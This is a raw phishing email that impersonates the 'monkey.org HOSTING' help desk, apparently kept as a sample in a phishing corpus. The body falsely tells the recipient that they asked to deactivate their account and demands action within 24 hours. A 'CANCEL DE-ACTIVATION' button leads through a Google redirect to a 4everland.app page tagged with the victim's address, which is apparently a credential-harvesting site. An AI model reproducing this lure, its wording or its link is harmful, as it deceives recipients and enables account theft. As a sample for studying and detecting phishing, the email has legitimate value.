@@ -1,0 +1,189 @@
+Return-Path: news@newspread-ie.com
+Delivered-To: jose@monkey.org
+X-FDA: 83662219158.11.1670351
+Received: from srv95826.yourbestnetwork.net (newspread-ie.com [85.158.110.4])
+	by imf11.b.hostedemail.com (Postfix) with ESMTP id 2A92D80003
+	for <jose@monkey.org>; Mon, 14 Jul 2025 08:38:37 +0000 (UTC)
+Authentication-Results: imf11.b.hostedemail.com;
+	dkim=pass header.d=newspread-ie.com header.s=dkim header.b=EcmTnkhz;
+	spf=pass (imf11.b.hostedemail.com: domain of news@newspread-ie.com designates
+ 85.158.110.4 as permitted sender) smtp.mailfrom=news@newspread-ie.com;
+	dmarc=pass (policy=reject) header.from=newspread-ie.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1752482318;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=wYjJx8NGAya+XlYMhU/XvzXfDzpmiIEOvh2eAJlWdfs=;
+	b=q1mXwVk1iN/wyInj1Gm1mAHfMhkttjMW7+IrmN3KwGxHdqsmhijpnepjNPzlt2d6SNNKBF
+	0DydX59kJXh1+MUXNsOLzyjG26a+Yx+uNBC+cPBUar9SDMowipm4Ppxc7h4H7EOndI8dkQ
+	n7srYW9UJlTx1De22ImubBvg5FUOBhk=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1752482318; a=rsa-sha256;
+	cv=none;
+	b=iyK66pPHAZ1c5KjDH9a4aYhu/eTOdiRBIIaMIJVA2vkGWxIUs4CRIcnfjkEXggFb6rhBAx
+	t3p+5hm07ob3TkIjnFa4rEikWMEZqCbREwEt6FTZDSXuOlf+cWiu0zDTZ/FwZ8k2J4tp5h
+	/agyqk0fuogzU9nhma0zai2bykK+z5k=
+ARC-Authentication-Results: i=1;
+	imf11.b.hostedemail.com;
+	dkim=pass header.d=newspread-ie.com header.s=dkim header.b=EcmTnkhz;
+	spf=pass (imf11.b.hostedemail.com: domain of news@newspread-ie.com designates
+ 85.158.110.4 as permitted sender) smtp.mailfrom=news@newspread-ie.com;
+	dmarc=pass (policy=reject) header.from=newspread-ie.com
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=newspread-ie.com; s=dkim; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=wYjJx8NGAya+XlYMhU/XvzXfDzpmiIEOvh2eAJlWdfs=; b=EcmTnkhz5Rt14hiWVQwV3eEOOo
+	kSnVLE9a2qx8BtSQjE9/FYs+OW//qbGkMbeftR/48/e49HExJYSE0qvAAUjfJJm+eBx2eYK/5E864
+	TuCDKshzPqJouPnLXu3ykzn1mWPMw3POLKL+stV7n1855baT8hIc6KaCMEWkdKXp4hZA=;
+Received: from [216.250.252.102] (helo=newspread-ie.com)
+	by srv95826.yourbestnetwork.net with esmtpa (Exim 4.93)
+	(envelope-from <news@newspread-ie.com>)
+	id 1ubEho-0009n5-7Y
+	for jose@monkey.org; Mon, 14 Jul 2025 08:38:36 +0000
+From: monkey.org HOSTING <news@newspread-ie.com>
+To: jose@monkey.org
+Subject: De-activation Notice on: jose@monkey.org
+Date: 14 Jul 2025 01:38:35 -0700
+Message-ID: <20250714013835.2CC31FB3B50F2DF7@newspread-ie.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Rspamd-Server: rspam04
+X-Rspamd-Queue-Id: 2A92D80003
+X-Stat-Signature: s7hjq45w76pdgo8iikgkcf4tcbuj31he
+X-Spam-Status: No, score=7.51
+X-HE-Tag: 1752482317-919951
+X-HE-Meta: 
+ U2FsdGVkX1+4AnqJIXE5gUkemid6T426AgfcOJOwYFClCrgUeaVnC466pgXNemtYUDWrmDnW0wVdtwRuZF8hTqcJ4HIcLt3yQ5wdRClaK7hDxybprbH89G8i0Nmt6dyAFrYB7sZTyg2w1AUK6/07r9ZIR7q/NT8EaaeO0i0xMYQoDY+O10ps6Bh/q0yYEGAQ4OY/MnDecTAhOKoLxQPiOO6FgYga9ZBcF5hzGJYViHIVcKLJZfoQrvILxW+HYZ7vTJv1G6qw9peljF6WyQY++Lue9FP2mbL9MNm851lyZ+Xm147jDQfD7Gx4BirptQjhPJMaRXRrwvuYiSQUlV1vzIjw0D4klXXjbLZFQlXIG2d+uKFcUK5aN/vw8M7Djj9yIAfJSZqzRzqoJQA3KMQddxBz0L6S4lcTKA6lj5SfH5bDva8HpSf7gFG+ZTZQQEGZg0cI/CvFD+BiZ2sLaAyFjyzVRUop0Ymue8cHky8gzGZSmchY5ooDKUYJk/Ve+eQgsH9FYIYEpXlcWZzIq2j26NL6ja+iNeAnuyi6Ytd114ZHwG7J/Cx1NZ94WXWcAZO9UAOOxw4RYDoY0RDxe27wSFE4Si7mvgx5CTnke2zitubG5OIm1Wt0c+/o33VE9hH5oLwKJcXqXo1Z4+4B4LCLY5m0LCOSsZjSqrZL209koffKANahvEyJFrpQDODeLgxID3aRzZDsvq8yc1N0kl/Fqfmi2hgubP7kWS5QouIJcHEzoSsTGnlLTiyz8GpXVkP6At6YtiVWRVRVshK3IFdFYUQXtQnGWBzXMwNEDwu6SlxhTX2Z+grhCgIhJ0Te2PyKr2lraJiucgdkVSQVXftd4k7yQ8QVPGGdDZ9zbct5VXyW5MVsP8G36O1uH+LFxvmESgw2xkMrMYOdgps5hlV3lSguLTBEoh34BbCLwXNLJNkWxq9NsSFxaMsiZ8QnE+jIysSLJ0ApRNAvwUd7kyNIUQAK+ho
+ X9TIGPWCuFpy2zSbtYWfUpANFKvc6HQ3CypB8glq3xaqgbj+nWvyxAiebfFDmtiQ/RbS1t91E+jWG+r6++5BQw/c4yKa5zoVAStjceTtK4JOynqVedXx3vk/KJZMkoZetBW41TQGuHr+Z+d2aLpTFfBS5VyP/VYZTlHudbVA6iuKypWBZBVAxYu2PM23u4B0PZiiuNUjzd3mR7QefDjbOyBekmdtUdlYY2kyd1FRj/l/1116tzMBpFDpd8Pj1Q5bJomabAF7blfwq1rqn0y67uUInHZvef46Ei+8JOdT8IEC7ro0RVE34JtWmOgDGiNybuDo/sa6HmHyNyO0qD7ihfFBM1uoYWa7tMxyfNZLdMum2to9MqW+jNVDdiTb3rzpy95849S0g/WbssaXpIvek8PVaRv3Nrpuga4aEzcWLc8SQorLBhc7FJ6H5u6E+8iKo6t+X6hsvV45Ld//1C3YT0FgLjX0IkxulkFH/R3NwuOaX0BUhGBHaGDcLQd08nZ/WUb+ABPl/reOuwWPaBTJJRuI6CefWO7PfaNtpMHWvnoqjtDeT6jpFvRS/+OwK41GBfndPrxX75eADtcRnebwnkZvD+66QABrzPyqeYaG3ZHSxJNHwNNf1+i2sCA==
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 290
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<DIV aria-expanded=3Dfalse spellcheck=3Dfalse role=3Dtextbox tabIndex=3D1 a=
+ria-label=3D"Message Body" aria-multiline=3Dtrue aria-controls=3D:z8 id=3D:=
+wu class=3D"Am aiL Al editable LW-avf tS-tW tS-tY" hideFocus contentEditabl=
+e=3Dtrue style=3D"DIRECTION: ltr; MIN-HEIGHT: 212px" aria-owns=3D:z8 g_edit=
+able=3D"true" writingsuggestions=3D"false">
+<TABLE style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-SIZE: =
+14px; MAX-WIDTH: 680px; FONT-FAMILY: arial, sans-serif; BORDER-RIGHT-WIDTH:=
+ 0px; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; BOR=
+DER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(=
+44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; LETTER-SPACING: normal; BO=
+RDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(244,244,244); font-variant-ligat=
+ures: normal; font-variant-caps: normal;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D680 border=
+=3D0>
+<TBODY>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: "Helveti=
+ca Neue", Helvetica, Arial, sans-serif; COLOR: rgb(51,51,51); MARGIN: 0px' =
+height=3D25 width=3D680>
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px" align=3Dcenter>monkey.=
+org</P></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-TOP: rgb(232,2=
+32,232) 2px solid; BORDER-RIGHT: rgb(232,232,232) 2px solid; BORDER-BOTTOM:=
+ rgb(255,108,44) 2px solid; PADDING-BOTTOM: 20px; PADDING-TOP: 15px; PADDIN=
+G-LEFT: 0px; BORDER-LEFT: rgb(232,232,232) 2px solid; MARGIN: 0px; PADDING-=
+RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255)">
+<TABLE style=3D'BOX-SIZING: border-box; FONT-FAMILY: "Helvetica Neue", Helv=
+etica, Arial, sans-serif; BORDER-COLLAPSE: collapse; background-size: initi=
+al; background-origin: initial; background-clip: initial' cellSpacing=3D0 c=
+ellPadding=3D0 width=3D680 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-FAMILY: arial, sans-serif; MARGIN=
+: 0px" width=3D15>&nbsp;</TD>
+<TD style=3D"BOX-SIZING: border-box; FONT-FAMILY: arial, sans-serif; MARGIN=
+: 0px" width=3D650>
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellSpac=
+ing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; MARGIN: 0px">
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: Verdana, =
+Geneva, sans-serif; MARGIN-TOP: 0px; COLOR: rgb(51,51,51); TEXT-ALIGN: cent=
+er" align=3Djustify><SPAN style=3D"BOX-SIZING: border-box">Hello&nbsp;<B>jo=
+se@monkey.org</B>,<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZ=
+ING: border-box"></SPAN>&nbsp;&nbsp; We receive a request from you to deact=
+ivate your email account<SPAN style=3D"BOX-SIZING: border-box"><SPAN style=
+=3D"BOX-SIZING: border-box"><SPAN>&nbsp;</SPAN>&nbsp;and&nbsp;</SPAN>
+</SPAN>access to your email will soon be closed.<BR style=3D"BOX-SIZING: bo=
+rder-box"><SPAN style=3D"BOX-SIZING: border-box"><SPAN style=3D"BOX-SIZING:=
+ border-box"><BR style=3D"BOX-SIZING: border-box"></SPAN></SPAN>&nbsp; We r=
+ecommend that you cancel the request below within 24 hours to avoid any unw=
+anted consequences. Failure to do so will result in the deactivation of you=
+r account and it will be permanently suspended and closed.<SPAN style=3D"BO=
+X-SIZING: border-box"><SPAN style=3D"BOX-SIZING: border-box">
+<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box">S=
+erver IMAP&nbsp;Address (POP3) :<SPAN style=3D"BOX-SIZING: border-box">&nbs=
+p;</SPAN></SPAN></SPAN> <SPAN style=3D"BOX-SIZING: border-box"><B>jose@monk=
+ey.org</B></SPAN> <SPAN style=3D"BOX-SIZING: border-box"><SPAN style=3D"BOX=
+-SIZING: border-box"><SPAN style=3D"BOX-SIZING: border-box"></SPAN><SPAN st=
+yle=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"></SPAN>=
+Server Domain&nbsp;:<SPAN style=3D"BOX-SIZING: border-box">
+<SPAN style=3D"BOX-SIZING: border-box">&nbsp;</SPAN></SPAN></SPAN></SPAN> m=
+onkey.org <SPAN style=3D"BOX-SIZING: border-box"><SPAN style=3D"BOX-SIZING:=
+ border-box"><SPAN style=3D"BOX-SIZING: border-box"><SPAN style=3D"BOX-SIZI=
+NG: border-box"></SPAN></SPAN></SPAN><BR style=3D"BOX-SIZING: border-box"><=
+BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"><S=
+PAN style=3D"BOX-SIZING: border-box">
+<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: rgb(0,0,2=
+04); BACKGROUND-COLOR: transparent" href=3D"https://www.google.com/url?q=3D=
+https%3A%2F%2Fvdm-2-g2vc.4everland.app%2F&amp;sa=3DD&amp;sntz=3D1&amp;usg=
+=3DAOvVaw0tKVrL-I-EvYSmuIXYkRiP#jose@monkey.org" rel=3Dnoreferrer target=3D=
+_blank>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 24px; BORDER-TOP: rgb(8,4=
+4,64) 1px solid; BORDER-RIGHT: rgb(8,44,64) 1px solid; BORDER-BOTTOM: rgb(8=
+,44,64) 1px solid; FONT-WEIGHT: bold; COLOR: rgb(255,102,0); PADDING-BOTTOM=
+: 5px; PADDING-TOP: 5px; PADDING-LEFT: 35px; BORDER-LEFT: rgb(8,44,64) 1px =
+solid; LETTER-SPACING: 2px; LINE-HEIGHT: 2em; PADDING-RIGHT: 35px; BACKGROU=
+ND-COLOR: rgb(0,71,171); border-radius: 8px">CANCEL DE-ACTIVATION</SPAN></A=
+></SPAN></SPAN></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: Verdana, =
+Geneva, sans-serif; MARGIN-TOP: 0px; COLOR: rgb(51,51,51); TEXT-ALIGN: cent=
+er" align=3Djustify><SPAN style=3D"BOX-SIZING: border-box"><SPAN style=3D"B=
+OX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"><BR style=3D"BO=
+X-SIZING: border-box">Thank you for choosing our services.<SPAN style=3D"BO=
+X-SIZING: border-box; FONT-WEIGHT: bold; COLOR: rgb(255,102,0)"><SPAN style=
+=3D"BOX-SIZING: border-box"><SPAN style=3D"BOX-SIZING: border-box">
+<BR style=3D"BOX-SIZING: border-box"></SPAN></SPAN></SPAN></SPAN></SPAN></P=
+></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; MARGIN: 0px">
+<DIV style=3D'BOX-SIZING: border-box; BORDER-TOP: rgb(232,232,232) 2px soli=
+d; FONT-FAMILY: "Helvetica Neue", Helvetica, Arial, sans-serif; MARGIN-TOP:=
+ 5px; COLOR: rgb(102,102,102); PADDING-TOP: 5px'>
+<P style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; MARGIN: 5px 0px 0px; PADDING-RIGHT: 0px"><SPAN style=3D"=
+BOX-SIZING: border-box; VERTICAL-ALIGN: inherit; FONT-WEIGHT: bold"><SPAN s=
+tyle=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit">The system generat=
+ed this advisory on,&nbsp;</SPAN></SPAN><B style=3D"BOX-SIZING: border-box;=
+ FONT-WEIGHT: bolder">7/14/2025 1:38:35 a.m.</B></P></DIV></TD></TR></TBODY=
+></TABLE></TD>
+<TD style=3D"BOX-SIZING: border-box; FONT-FAMILY: arial, sans-serif; MARGIN=
+: 0px" width=3D15>&nbsp;</TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; PADDING-TOP: 10px; MA=
+RGIN: 0px" align=3Dcenter><B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: =
+bolder">&nbsp;<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: "Helvetic=
+a Neue", Helvetica, Arial, sans-serif; COLOR: rgb(102,102,102)'>&nbsp;Copyr=
+ight &copy; 2025&nbsp;</SPAN></B> monkey.org <B style=3D"BOX-SIZING: border=
+-box; FONT-WEIGHT: bolder">
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: "Helvetica Neue", Helve=
+tica, Arial, sans-serif; COLOR: rgb(102,102,102)'>&nbsp;help desk. All righ=
+ts reserved</SPAN></B></TD></TR></TBODY></TABLE><BR></DIV></BODY></HTML>
+
